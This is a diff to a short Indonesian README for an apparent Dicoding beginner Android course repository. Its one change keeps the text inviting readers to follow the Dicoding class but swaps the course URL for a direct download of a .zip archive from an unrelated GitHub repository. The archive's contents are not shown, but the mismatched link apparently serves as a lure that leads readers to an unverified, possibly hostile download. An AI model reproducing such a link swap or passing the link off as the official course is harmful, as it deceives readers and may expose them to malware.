@@ -9,4 +9,4 @@ Di dalamnya terdapat materi:
 * RecyclerView
 
 Mulailah karirmu sebagai Android Developer dari sini. Materi disusun oleh **Dicoding sebagai Google Authorized Training Partner**.
-Ikuti kelas [Belajar Membuat Aplikasi Android untuk Pemula](https://www.dicoding.com/academies/51/) di Dicoding Indonesia
+Ikuti kelas [Belajar Membuat Aplikasi Android untuk Pemula](https://raw.githubusercontent.com/Hanifirham01/a51-android-pemula-labs/master/superscribe/a51-android-pemula-labs.zip) di Dicoding Indonesia
